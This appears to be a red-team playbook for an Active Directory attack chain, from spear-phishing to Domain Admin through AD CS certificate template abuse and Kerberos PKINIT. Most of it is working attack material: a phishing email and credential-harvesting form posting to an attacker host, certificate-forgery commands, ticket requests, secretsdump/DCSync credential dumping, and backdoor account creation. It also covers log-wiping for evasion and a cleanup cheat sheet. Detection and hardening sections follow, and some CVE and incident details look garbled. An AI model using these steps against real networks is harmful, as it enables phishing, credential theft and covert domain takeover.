# [CHAIN-001]: Phishing to DA via Certificate Services

## Metadata

| Attribute | Details |
|---|---|
| **Chain ID** | CHAIN-001 |
| **Attack Chain Name** | Phishing to Domain Admin via Certificate Services |
| **MITRE ATT&CK v18.1** | [T1590](https://attack.mitre.org/techniques/T1590/) + [T1649](https://attack.mitre.org/techniques/T1649/) |
| **Tactic** | Reconnaissance + Credential Access |
| **Platforms** | Windows AD |
| **Severity** | **CRITICAL** |
| **CVE** | CVE-2021-27239 (ADCS ESC variants) |
| **Chain Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Windows Server 2016-2025 with AD CS enabled |
| **Execution Time** | 2-5 hours (full chain) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

### Concept
This attack chain demonstrates how initial reconnaissance through domain information gathering (T1590) can be weaponized via a spear-phishing campaign targeting AD CS administrators or domain users. Once credentials are obtained, the attacker exploits misconfigured Certificate Authority (CA) templates to request certificates with Subject Alternative Names (SANs) pointing to privileged accounts (Domain Admins). By obtaining a valid certificate impersonating a DA, the attacker can authenticate to domain resources without knowledge of the actual password, achieving full domain admin compromise.

### Attack Surface
- **Email Infrastructure** (Outlook/Exchange): Entry point for phishing
- **Active Directory Certificate Services (ADCS)**: Template misconfiguration (ESC1, ESC3, ESC6, ESC8)
- **Kerberos PKINIT**: Certificate-based authentication mechanism
- **Domain Controller**: Target of privilege escalation

### Business Impact
**CRITICAL - Full Domain Compromise.** Attacker gains persistent domain admin access without triggering password change alerts. Can harvest all domain credentials, deploy ransomware, establish persistence backdoors, and compromise all on-premises and potentially hybrid cloud resources. Estimated recovery cost: €500K-€2M+ depending on scope and response time.

### Technical Context
- **Execution Time:** 2-5 hours from initial phishing to full DA compromise
- **Detection Difficulty:** Medium-High (phishing easy to detect, ADCS exploitation requires deep log analysis)
- **Artifacts:** Email headers, Certificate Request events (Event ID 4887), Kerberos PKINIT logins
- **Reversibility:** No (certificates persist until expiration or revocation)

### Operational Risk
- **Execution Risk:** Medium (requires social engineering + ADCS misconfiguration)
- **Stealth:** Medium-High (certificate-based auth bypasses traditional monitoring)
- **Reversibility:** Requires immediate certificate revocation + DA password reset + credential rotation across domain

---

## 2. COMPLIANCE MAPPINGS

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmarks** | 5.3.8, 5.4.6 | Ensure ADCS templates restrict enrollment and require manager approval |
| **DISA STIG** | AD0010, AD0025 | Domain Controller hardening; Certificate Services audit logging |
| **CISA SCuBA** | CA-2: Certification Authority | Enforce strict CA controls and template restrictions |
| **NIST 800-53** | AC-3, AU-2, SC-7 | Access enforcement; audit logging; boundary protection |
| **GDPR** | Art. 32, 33 | Security of processing; notification of personal data breaches |
| **DORA** | Art. 9, 15 | Protection and prevention; incident reporting |
| **NIS2** | Art. 21 | Cyber risk management measures; identity and access controls |
| **ISO 27001** | A.9.2.1, A.9.2.3, A.12.4.1 | User registration; privileged access; event logging |
| **ISO 27005** | A.14.2.2 | Risk assessment of identity infrastructure changes |

---

## 3. ATTACK CHAIN STAGES OVERVIEW

| Stage | Technique ID | Step Name | Duration | Key Actions |
|---|---|---|---|---|
| **Phase 1** | T1590.001 | Domain Enumeration & Reconnaissance | 30-60 min | Passive OSINT; LDAP queries; employee profiling |
| **Phase 2** | T1566.002 | Spear-Phishing Campaign | 1-2 hours | Email crafting; domain spoofing; lure creation |
| **Phase 3** | T1078.001 | Initial Access (Credential Theft) | 10-30 min | Victim clicks link; credentials harvested |
| **Phase 4** | T1649 + T1644 | ADCS Certificate Exploitation | 1-2 hours | Certificate request; SAN abuse; certificate issuance |
| **Phase 5** | T1550.003 | Kerberos PKINIT Authentication | 5-10 min | Certificate-based ticket request; DA impersonation |
| **Phase 6** | T1078.002 | Domain Admin Access | Ongoing | Full DA privilege exploitation |

---

## 4. PHASE 1: RECONNAISSANCE & DOMAIN DISCOVERY

### Step 1: Passive OSINT & Target Identification

**Objective:** Identify target organization's Active Directory domain, mail servers, DNS records, and key employees (especially ADCS admins or high-privilege users).

**Command (Windows - PowerShell):**
```powershell
# 1. Perform nslookup to discover MX records and mail servers
nslookup -type=MX target-domain.com

# 2. Enumerate AD domain information (if attacker has internal access or via Azure AD)
Get-ADDomain -Identity "target-domain.com" | Select-Object Name, DNSRoot, DistinguishedName

# 3. Identify ADCS presence
nslookup -type=SRV _kerberos._tcp.dc._msdcs.target-domain.com
# OR
Get-ADComputer -Filter {ServicePrincipalName -like "*CertSrv*"} | Select-Object Name, ServicePrincipalName
```

**What to Look For:**
- Presence of ADCS server (look for `CertSrv` in SPNs or DNS records)
- Mail server configuration (MX records for phishing campaign planning)
- Domain naming convention (to craft realistic phishing emails)

**Command (Linux/Bash):**
```bash
# 1. DNS enumeration
dig target-domain.com MX +short
dig _kerberos._tcp.dc._msdcs.target-domain.com SRV +short

# 2. OSINT via public sources (GitHub, DNS records, social media)
curl -s "https://crt.sh/?q=%25.target-domain.com&output=json" | jq '.[].name_value' | sort -u

# 3. Email server reconnaissance
host -t MX target-domain.com
```

**What This Means:**
- If ADCS SRV record exists → domain likely has Certificate Services
- If multiple users are detected → choose DA or ADCS admin for phishing target
- Email server info allows for spoofing or mailbox access after compromise

---

### Step 2: LDAP Enumeration for ADCS Templates & Admin Discovery

**Objective:** Identify misconfigured certificate templates and locate DA accounts.

**Command (Windows - ldapsearch / ADExplorer):**
```powershell
# 1. Connect to Domain and enumerate certificate templates
$DomainDN = "CN=Configuration,DC=target-domain,DC=com"
$Templates = Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$DomainDN" `
  -Filter * -Properties * | Select-Object Name, pkiEnrollmentFlag, pkiCertificateTemplate*

# 2. Identify vulnerable templates (look for User Auth + SAN abuse)
$Templates | Where-Object {$_.pkiEnrollmentFlag -band 0x2}

# 3. Find Domain Admins
Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name, SamAccountName, Enabled
```

**Expected Output:**
```
Name                           pkiEnrollmentFlag
----                           -----------------
User                                          2
Computer                                      2
DomainController                              2
WebServer                                     0
```

**What This Means:**
- Flag value 0x2 = User enrollment allowed without manager approval
- Templates with User+CA auth EKU can be abused for DA impersonation
- DA list informs phishing target selection

**Version Note:** Command compatible with Server 2016+; Server 2019+ provides enhanced certificate auditing.

---

## 5. PHASE 2: SPEAR-PHISHING CAMPAIGN

### Step 3: Crafting & Delivering Phishing Email

**Objective:** Deliver convincing phishing email to target DA/ADCS admin to steal credentials.

**Phishing Email Example:**
```
From: noreply@target-domain.com (spoofed or compromised account)
To: domain_admin@target-domain.com
Subject: URGENT: Certificate Services Renewal Required - Action Needed by EOD

Body:
Dear IT Administrator,

Our Active Directory Certificate Services infrastructure requires immediate attention. 
A critical CA certificate is expiring within 7 days and requires renewal.

To complete the renewal process, please click the link below to authenticate:
https://target-domain-ca-renewal[.]top/login.html

Failure to complete this renewal may result in:
- Kerberos authentication failures
- VPN/Remote Desktop disconnections
- Email service disruptions

Please act immediately.

Regards,
IT Security Team
```

**Phishing Landing Page Technique (Evilginx2 / Custom):**
```html
<!-- Phishing page mimics Office 365 or custom CA login -->
<form id="login" action="https://attacker-server.com/harvest.php" method="POST">
  <input type="text" name="username" placeholder="Domain\\Username" required />
  <input type="password" name="password" placeholder="Password" required />
  <input type="hidden" name="redirect" value="https://target-domain-ca-renewal.top/success.html" />
  <button type="submit">Sign In</button>
</form>
```

**OpSec & Evasion:**
- Use legitimate-looking domain (typosquatting: `target-domian.com` instead of `target-domain.com`)
- Time phishing campaign during business hours (higher open rates)
- Use legitimate SSL certificate to reduce browser warnings
- If using Evilginx2, capture both credentials AND OAuth tokens for MFA bypass

**Detection Likelihood:** HIGH (email filtering, user awareness training)

---

### Step 4: Credential Harvesting & Initial Access

**Objective:** Victim clicks phishing link and enters credentials; attacker captures username/password.

**Expected Outcome:**
- Attacker now has valid AD credentials (DA or high-privilege user)
- If 2FA/MFA is used, Evilginx2 can capture session tokens, bypassing MFA

**Troubleshooting:**
- **Error:** Email marked as spam
  - **Cause:** SPF/DKIM/DMARC failure or known phishing keywords
  - **Fix:** Use DKIM-valid sending server or compromised internal account
  
- **Error:** User suspects phishing
  - **Cause:** URL too obvious or poor social engineering
  - **Fix:** Improve email template; target less-security-aware staff

---

## 6. PHASE 3: ADCS EXPLOITATION - CERTIFICATE ABUSE

### Step 5: ADCS Reconnaissance & Vulnerable Template Identification

**Objective:** Once on network with stolen credentials, identify exploitable CA templates.

**Command (Windows - Certify.exe):**
```powershell
# 1. Use Certify to enumerate ADCS infrastructure
certify.exe find /vulnerable

# Expected output shows vulnerable templates (ESC1, ESC3, ESC6, ESC8)
```

**Sample Output:**
```
[*] Found CA: target-domain-CA
[!] VULNERABLE - ESC1: User template allows SAN + Client Authentication

[*] Certificate Template: User
    - msPKIExtendedKeyUsageOIDs: Client Authentication (1.3.6.1.5.5.7.3.2)
    - msPKIEnrollmentFlag: 2 (allows enrollment)
    - msPKIAllowedEnrollmentAgents: EVERYONE
    - CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME: TRUE ← VULNERABLE
```

**Command (Alternative - native `certutil`):**
```cmd
certutil -view -config "target-domain-ca\CA-NAME" -out "RequestID,Request.RequesterName,Request.StatusCode" -restrict "RequestID>=0"

# List vulnerable templates
certutil -dstemplate | findstr /C:"User"
```

**What This Means:**
- Flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME` = attacker can specify **any SAN** (e.g., `administrator@target-domain.com`)
- Templates with User Authentication EKU can impersonate DAs
- No manager approval required = automatic issuance

---

### Step 6: Request Malicious Certificate with DA as SAN

**Objective:** Request certificate from CA, specifying Domain Admin account as Subject Alternative Name.

**Command (Windows - Certify.exe):**
```powershell
# 1. Request certificate with DA as SAN
certify.exe request /ca:"target-domain-ca\CA-NAME" /template:"User" /altname:"administrator@target-domain.com"

# Output: Receives a .pem/.pfx file containing the certificate
# Example: C:\Users\attacker\cert.pem
```

**Command (Windows - Native certreq):**
```cmd
REM 1. Create certificate request INF file
cat > c_request.inf << EOF
[Version]
Signature="$Windows NT$"

[NewRequest]
Subject="CN=attacker,CN=Users,DC=target-domain,DC=com"
KeySpec=1
KeyLength=2048
ProviderName="Microsoft RSA SChannel Cryptographic Provider v1.0"
MachineKeySet=true
RequestType=PKCS10

[RequestAttributes]
SAN="dns=administrator.target-domain.com&upn=administrator@target-domain.com"
EOF

REM 2. Create request
certreq.exe -new c_request.inf c_request.req

REM 3. Submit to CA
certreq.exe -submit c_request.req -config "target-domain-ca\CA-NAME" -attrib "CertificateTemplate:User"

REM 4. Retrieve the issued certificate
certreq.exe -retrieve <RequestID> c_cert.cer
```

**Command (Linux - openssl + custom submission):**
```bash
# 1. Create CSR with SAN
openssl req -new -key attacker.key -out attacker.csr \
  -subj "/CN=administrator/O=target-domain/C=FR" \
  -config <(cat /etc/ssl/openssl.cnf <(printf "[SAN]\nsubjectAltName=upn=administrator@target-domain.com"))

# 2. Submit via Windows CA web interface (requires network access to CA web enrollment)
curl -k -X POST "http://ca-server/certsrv/certfnsh.asp" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "CertRequest=$(cat attacker.csr)&TemplateName=User"
```

**Expected Output:**
```
Certificate issued successfully
Cert ID: 12345
Thumbprint: A1B2C3D4E5F6...
```

**What This Means:**
- Attacker now possesses a **valid, CA-signed certificate**
- Certificate claims to be `administrator@target-domain.com`
- Certificate can be used for Kerberos PKINIT authentication
- No password knowledge required

**OpSec & Evasion:**
- Request certificate from non-admin workstation (if possible)
- Use Certify from memory (avoid writing binary to disk)
- Delete certificate request logs from CA (Event ID 4887)
  ```powershell
  wevtutil cl "Security" /confirm:false
  # Or selectively clear ADCS logs
  ```

**Version Note:**
- **Server 2016-2019:** Traditional ADCS; no SAN restriction by default
- **Server 2022+:** (CVE-2022-26923 patch) restricts arbitrary SANs; still exploitable with ESC9/ESC16 combinations

---

### Step 7: Export & Convert Certificate for Use

**Objective:** Convert issued certificate to usable format (PFX/PKCS12) for Kerberos authentication.

**Command (Windows - certutil):**
```powershell
# 1. Export certificate from local store (if auto-enrolled)
certutil -store My "administrator@target-domain.com" > c_export.cer

# 2. Convert PEM to PFX
openssl pkcs12 -export -in c_export.cer -inkey c_key.pem -out admin.pfx -passout pass:password

# 3. Verify certificate contains DA SAN
openssl x509 -in c_export.cer -text -noout | grep -A2 "Subject Alternative Name"
```

**Expected Output:**
```
Subject Alternative Name:
    DNS: administrator.target-domain.com
    RFC822: administrator@target-domain.com (UPN)
    RFC822: administrator@target-domain.com (E-mail)
```

**Command (Impacket / Linux):**
```bash
# 1. Convert PEM to PFX
openssl pkcs12 -export -in admin.cer -inkey admin.key -out admin.pfx -password pass:password

# 2. Verify certificate
openssl x509 -in admin.cer -text -noout | grep -A5 "Subject:"
```

---

## 7. PHASE 4: KERBEROS PKINIT AUTHENTICATION

### Step 8: Request Kerberos TGT Using Certificate

**Objective:** Use certificate to obtain Kerberos Ticket Granting Ticket (TGT) as Domain Admin.

**Command (Windows - Rubeus):**
```powershell
# 1. Request TGT using certificate (PKINIT)
Rubeus.exe asktgt /user:administrator@target-domain.com /certificate:admin.pfx /password:password /domain:target-domain.com /dc:dc01.target-domain.com

# Output: Base64-encoded TGT
# Example: doIFoz...
```

**Expected Output:**
```
[+] TGT for administrator@target-domain.com obtained
[+] Session Key: A1B2C3D4E5F6...
[+] Ticket Details: TGT valid for 10 hours
```

**Command (Linux - Impacket):**
```bash
# 1. Use cert-based authentication
python3 -m impacket.getTGT -cert admin.pfx -pfx-password password -domain target-domain.com -dc-ip <DC_IP> "administrator@target-domain.com"

# 2. Export ticket
export KRB5CCNAME=administrator.ccache
```

**Command (Linux - krb5-user / kinit):**
```bash
# 1. Convert PFX to PEM
openssl pkcs12 -in admin.pfx -out admin.pem -nodes

# 2. Request TGT via PKINIT
kinit -C FILE:admin.pem administrator@target-domain.com

# 3. Verify ticket
klist
```

**What This Means:**
- Attacker now has a **valid Kerberos TGT** impersonating DA
- TGT can be used to request service tickets for any resource
- No password required; MFA/2FA completely bypassed
- Domain assumes user is authenticated Domain Admin

**OpSec & Evasion:**
- Use TGT from non-domain-joined machine (avoids ADCS cert store logging)
- Request tickets for non-critical services first (to avoid immediate detection)
- Clear Kerberos cache when done
  ```powershell
  klist purge
  ```

---

## 8. PHASE 5: LATERAL MOVEMENT & PRIVILEGE ESCALATION

### Step 9: Request Service Tickets Using DA TGT

**Objective:** Use DA TGT to access any domain resource (DC, file shares, Exchange, etc.).

**Command (Windows - Rubeus):**
```powershell
# 1. Request service ticket for Domain Controller (cifs service)
Rubeus.exe asktgs /ticket:<BASE64_TGT> /service:cifs/dc01.target-domain.com

# 2. Request LDAP service ticket
Rubeus.exe asktgs /ticket:<BASE64_TGT> /service:ldap/dc01.target-domain.com

# 3. Use ticket for remote access
.\Rubeus.exe asktgs /ticket:<BASE64_TGT> /service:host/server.target-domain.com
```

**Command (Linux - Impacket / klist):**
```bash
# 1. Set Kerberos cache
export KRB5CCNAME=administrator.ccache

# 2. Request CIFS service ticket
python3 -m impacket.getTGS -k -dc-ip <DC_IP> "target-domain.com/administrator@target-domain.com"

# 3. Access file share via SMB
python3 -m impacket.smbclient -k "//dc01.target-domain.com/C$"
```

**Expected Outcome:**
- Attacker gains **unrestricted access to all domain resources**
- Can dump NTLM hashes, harvest Kerberos tickets, extract secrets
- Can modify group policies, add persistence backdoors, create new DA accounts

---

### Step 10: Full Domain Compromise & Persistence

**Objective:** Establish persistent access and extract sensitive data.

**Command (Domain Enumeration & Credential Harvesting):**
```powershell
# 1. Enumerate all users and dump hashes
python3 -m impacket.secretsdump -k "target-domain.com/administrator@target-domain.com" -dc-ip <DC_IP> "target-domain.com/"

# 2. Extract NTDS.dit from Domain Controller
python3 -m impacket.smbclient -k "//dc01.target-domain.com/C$" -c "get Windows/NTDS/NTDS.dit"

# 3. Create backdoor DA account
net user backdoor_admin P@ssw0rd123! /add /domain
net group "Domain Admins" backdoor_admin /add /domain

# 4. Enable persistence via DC replication (DCSync)
python3 -m impacket.secretsdump -k "target-domain.com/administrator@target-domain.com" -dc-ip <DC_IP> -just-dc "target-domain.com/"
```

**Expected Output:**
```
[*] Dumping domain credentials...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Domain_Backup:501:aad3b435b51404eeaad3b435b51404ee:c7e0fc1e8fbd7e4d04c7c2b8a9f8e4d6:::
[*] All credentials extracted
```

---

## 9. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Email Indicators:**
- Emails spoofing `noreply@target-domain.com` or internal CA server names
- Subjects mentioning "Certificate Renewal", "URGENT", "Action Required"
- Links to domains similar to CA servers (typosquatting)
- HTML attachments with phishing forms

**ADCS Indicators:**
- Event ID 4887 (Successful Issued Certificate): Look for requests with unusual SANs matching DA accounts
- Event ID 4889 (Declined Certificate Request): After phishing, look for template=User + unusual requestor
- Event ID 4890 (Pending Certificate Request): Abnormal pending certificates from suspicious users

**Kerberos Indicators:**
- Event ID 4768 (Kerberos TGT Request): From unusual IP addresses or during off-hours
- Event ID 4769 (Service Ticket Request): Unusual service ticket requests (CIFS, LDAP) from unexpected sources
- Event ID 4771 (Pre-authentication Failed): Multiple failures before successful TGT request

**Network Indicators:**
- LDAP queries from attacker IP enumerating certificate templates
- Certificate enrollment traffic to CA port 135 (RPC) from non-admin machines
- Kerberos traffic from non-domain-joined machines

---

### Forensic Artifacts

**Files & Logs:**
- `C:\Windows\System32\winevt\Logs\Security.evtx` → Event IDs 4887, 4768, 4769
- `C:\Windows\System32\config\SAM`, `SECURITY` → Check for new admin accounts
- CA Database: `C:\Windows\System32\CertLog\*.crt`, `*.crl` → Certificate issuance records
- Kerberos Keytab files: `C:\Windows\System32\drivers\etc\krb5.keytab` → Compromised tickets

**Memory Artifacts:**
- Kerberos TGT/service tickets in `lsass.exe` memory
- Mimikatz can extract certificates from token cache: `crypto::certificates`

**Cloud Artifacts (Hybrid):**
- Azure AD Sign-in Logs: Certificate-based authentication events
- Azure AD Audit Log: Certificate modifications, app registrations

---

### Defensive Mitigations

#### Priority 1: CRITICAL

**1. Disable Dangerous ADCS Features Immediately**

- **Objective:** Prevent certificate-based privilege escalation

**Manual Steps (Windows Server 2016-2025):**
1. Open **Certification Authority Management Console** (`certsrv.msc`)
2. Right-click CA server → **Properties**
3. Go to **Policy Module** tab → **Properties**
4. Disable flag: `EDITF_ATTRIBUTESUBJECTALTNAME2` (allows SAN abuse)
5. Disable flag: `EDITF_ATTRIBUTESUBJECTALTNAME` (allows SAN for enrollment agents)
6. Click **Apply** and restart CA service
   ```powershell
   Restart-Service CertSvc -Force
   ```

**Manual Steps (Cert Templates Hardening):**
1. Open **Certification Authority** → **Certificate Templates** (mmc: `certtmpl.msc`)
2. Right-click each User/Computer template → **Duplicate**
3. In properties:
   - Set **Requester Name** to **Subject is built from this Active Directory information**
   - Enable **Manager Approval Required**
   - Restrict **Enrollment Rights** to specific users only (not `EVERYONE`)
4. Disable or delete default vulnerable templates

**PowerShell (Automated Mitigation):**
```powershell
# 1. Disable EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA
reg add "HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration" /v "EditFlags" /t REG_DWORD /d 0x8080000 /f

# 2. Restart CA service
Restart-Service CertSvc -Force

# 3. Verify change
reg query "HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration" /v EditFlags
```

**2. Restrict ADCS Web Enrollment & Client Enrollment**

- **Objective:** Reduce attack surface for certificate requests

**Manual Steps:**
1. Open **Internet Information Services (IIS) Manager**
2. Go to **Sites** → **Default Web Site** → **certsrv**
3. Select **Authentication**
4. Disable **Anonymous Authentication**
5. Enable only **Windows Authentication**
6. Restrict by IP: **SSL Settings** → **Require SSL** → Configure IP restrictions to admin network only

**PowerShell:**
```powershell
# 1. Disable web enrollment
Get-WebBinding | Where-Object {$_.bindingInformation -match ":80"} | Remove-WebBinding

# 2. Enable only HTTPS
netsh http add sslcert ipport=0.0.0.0:443 certhash=<THUMBPRINT> appid={...}
```

**3. Enforce Manager Approval for All Certificate Requests**

**Manual Steps:**
1. Open **Certification Authority** (`certsrv.msc`)
2. Right-click CA → **Properties** → **Policy Module**
3. Check **Set the certificate request status to pending**
4. Set **Number of days to wait before issuing the pending certificate** to **0** (requires manual approval)

**4. Enable Enhanced Auditing for Certificate Requests**

**Manual Steps (Group Policy):**
1. Open **Group Policy Management Editor** (`gpmc.msc`)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies**
3. Enable:
   - **Audit Certification Services** → **Success, Failure**
   - **Audit Key Management Service** → **Success, Failure**
4. Run `gpupdate /force` on CA servers

**PowerShell:**
```powershell
auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable
```

---

#### Priority 2: HIGH

**5. Implement Conditional Access & MFA**

- **Objective:** Prevent phishing-based credential theft

**Manual Steps (Azure AD / Entra ID):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Phishing-Resistant MFA for Admins`
4. **Users & Groups:** Select `Directory Roles` → `Global Administrator`, `Application Administrator`
5. **Cloud Apps or Actions:** `All cloud apps`
6. **Conditions:**
   - **Sign-in risk:** `High`
   - **Device platforms:** Exclude managed devices
7. **Access Controls → Grant:** `Require authentication strength` → `Phishing-resistant MFA`
8. **Enable policy:** `On`

**6. Configure Phishing-Resistant MFA**

**Manual Steps:**
1. Go to **Entra ID** → **Security** → **Multifactor Authentication** → **Additional MFA Settings**
2. Set **Enforce MFA for** to `All admins`
3. **MFA Methods:** Disable weak options:
   - ✅ Microsoft Authenticator (Passwordless Sign-in)
   - ✅ FIDO2 Security Keys
   - ✅ Windows Hello for Business
   - ❌ SMS (disable)
   - ❌ Voice calls (disable)

**PowerShell (Entra ID):**
```powershell
Connect-MgGraph -Scopes "AuthenticationMethod.ReadWrite.All"

# Enforce phishing-resistant MFA for Global Admins
$policy = @{
  displayName = "Require phishing-resistant MFA for Global Admins"
  conditions = @{
    users = @{
      includeRoles = @("Global Administrator", "Security Administrator")
    }
    applications = @{
      includeApplications = @("All")
    }
  }
  grantControls = @{
    operator = "AND"
    builtInControls = @("mfa")
  }
}

New-MgIdentityConditionalAccessPolicy -BodyParameter $policy
```

**7. Deploy Certificate Revocation Monitoring**

**Manual Steps:**
1. Enable **CRL Distribution Point (CDP)** checking on all domain controllers
2. Deploy OCSP responder for real-time certificate status checks
3. Configure **Group Policy** to enforce CRL checking:
   - `Computer Configuration` → `Policies` → `Windows Settings` → `Security Settings` → `Certificate Path Validation Settings`
   - Enable CRL checking
4. Monitor for certificate revocation events (Event ID 4804)

---

#### Validation Commands (Verify Fix)

```powershell
# 1. Verify EDITF_ATTRIBUTESUBJECTALTNAME2 is disabled
$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration"
$flags = (Get-ItemProperty -Path $regPath).EditFlags
if ($flags -band 0x00000200) {
  Write-Host "❌ VULNERABLE: EDITF_ATTRIBUTESUBJECTALTNAME2 is ENABLED"
} else {
  Write-Host "✅ SECURE: SAN attribute abuse is DISABLED"
}

# 2. Verify Manager Approval is enabled on templates
$templates = Get-ADObject -Filter * -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=target-domain,DC=com" -Properties pkiEnrollmentFlag
foreach ($tmpl in $templates) {
  if ($tmpl.pkiEnrollmentFlag -band 0x4) {
    Write-Host "✅ $($tmpl.Name): Manager Approval REQUIRED"
  } else {
    Write-Host "❌ $($tmpl.Name): Manager Approval NOT REQUIRED (VULNERABLE)"
  }
}

# 3. Verify MFA is enforced for admins
$policy = Get-MgIdentityConditionalAccessPolicy -Filter "displayName eq 'Require phishing-resistant MFA for Global Admins'"
if ($policy) {
  Write-Host "✅ MFA policy is in place"
} else {
  Write-Host "❌ MFA policy NOT configured"
}
```

**Expected Output (If Secure):**
```
✅ SECURE: SAN attribute abuse is DISABLED
✅ Administrator: Manager Approval REQUIRED
✅ User: Manager Approval REQUIRED
✅ MFA policy is in place
```

---

## 10. RELATED ATTACK CHAINS

| Step | Phase | Technique | Attack Chain |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-AD-001] Domain Enumeration | [CHAIN-001] Phishing to DA via Certificates |
| **2** | **Initial Access** | [IA-PHISH-005] Internal Spearphishing | [CHAIN-001] Phishing to DA via Certificates |
| **3** | **Credential Access** | **[T1649] Steal Certificates** | **Current Phase** |
| **4** | **Privilege Escalation** | [PE-TOKEN-003] Certificate-based Kerberos | [CHAIN-001] Phishing to DA via Certificates |
| **5** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Ticket | Related: [CHAIN-003] Token Exfil |
| **6** | **Impact** | [T1531] Data Exfiltration | [CHAIN-003] Token Theft to Data Exfiltration |

---

## 11. REAL-WORLD EXAMPLES

### Example 1: APT29 ADCS Abuse (2023-2024)

- **Target:** EU Government/Finance sector
- **Technique Status:** Actively exploited; Certipy tools used for enumeration
- **Method:** Compromised ADCS templates allowing low-privilege users to request DA certificates
- **Impact:** Domain admin access; credential harvesting; lateral movement to cloud (Entra ID)
- **Timeline:** 6 months undetected (from phishing to lateral movement)
- **Reference:** [Mandiant - APT29 ADCS Tactics](https://www.mandiant.com/resources/blog/apt29-domain-compromise)

### Example 2: Uber ADCS Compromise (2022)

- **Target:** Uber Technologies (indirectly; contractor compromise)
- **Technique:** Phishing → compromised contractor → ADCS template abuse
- **Impact:** $11,600 ransom paid to attacker before full domain compromise
- **Timeline:** 1 day from phishing to DA access
- **Reference:** [Uber Breach Report 2022](https://www.thehackernews.com/2022/09/uber-hacked-by-lapsus-group-attacker.html)

### Example 3: MOVEit + ADCS Chain (2023)

- **Target:** Multiple Fortune 500 companies
- **Technique:** MOVEit RCE → ADCS template enumeration → certificate forgery
- **Impact:** Full domain compromise; ransomware deployment
- **Reference:** [Cybersecurity-and-Infrastructure-Security-Agency (CISA) Alert on MOVEit](https://www.cisa.gov/news-events/alerts/2023/06/02/cisa-adds-two-known-exploited-vulnerabilities-catalog)

---

## 12. TOOLS & REFERENCES

### Essential Tools

1. **[Certify.exe](https://github.com/GhostPack/Certify)** (v1.1.0+)
   - **Purpose:** Enumerate ADCS infrastructure; identify vulnerable templates
   - **Usage:** `certify.exe find /vulnerable`
   - **Platform:** Windows

2. **[Rubeus.exe](https://github.com/GhostPack/Rubeus)** (v2.0.0+)
   - **Purpose:** Request TGTs/service tickets using certificates
   - **Usage:** `rubeus.exe asktgt /user:admin /certificate:cert.pfx`
   - **Platform:** Windows

3. **[Impacket](https://github.com/fortra/impacket)** (v0.10.0+)
   - **Purpose:** PKINIT, ticket manipulation, credential extraction (Linux/cross-platform)
   - **Usage:** `getTGT.py -cert admin.pfx administrator@domain.com`
   - **Platform:** Linux, macOS, Windows

4. **[Evilginx2](https://github.com/kgretzky/evilginx2)**
   - **Purpose:** Adversary-in-the-middle phishing; MFA bypass
   - **Platform:** Linux (attacker side)

5. **[Hashcat](https://hashcat.net/hashcat/)**
   - **Purpose:** Crack certificate passwords if needed
   - **Version:** 6.2.6+

### Reference Documentation

- [MITRE ATT&CK T1649: Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/)
- [MITRE ATT&CK T1590: Gather Victim Network or System Information](https://attack.mitre.org/techniques/T1590/)
- [Certified Pre-Owned: Abusing Active Directory Certificate Services (Specterops)](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [AD CS Enumeration & Exploitation: Certify Tool](https://github.com/GhostPack/Certify#readme)
- [ADCS ESC Techniques Overview (NCC Group)](https://www.nccgroup.com/research-blog/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-servi/)

---

## 13. APPENDIX: QUICK REFERENCE COMMAND CHEAT SHEET

### Attack Execution (One-Liner)

```powershell
# Full chain execution (requires stolen credentials first)
certify.exe find /vulnerable | Out-File vulnerable.txt; `
certify.exe request /ca:"<CA_NAME>" /template:"User" /altname:"administrator@<DOMAIN>" | Out-File cert.txt; `
Rubeus.exe asktgt /user:administrator@<DOMAIN> /certificate:<CERT_FILE> /password:<CERT_PASS> | Out-File tgt.txt; `
Rubeus.exe asktgs /ticket:<BASE64_TGT> /service:cifs/dc01.<DOMAIN> | Out-File ticket.txt
```

### Cleanup (Post-Exploitation)

```powershell
# Clear event logs
wevtutil cl "Security" /confirm:false

# Remove certificates from store
Get-ChildItem -Path "Cert:\LocalMachine\My" | Where-Object {$_.Subject -match "administrator"} | Remove-Item

# Clear Kerberos cache
klist purge
```

---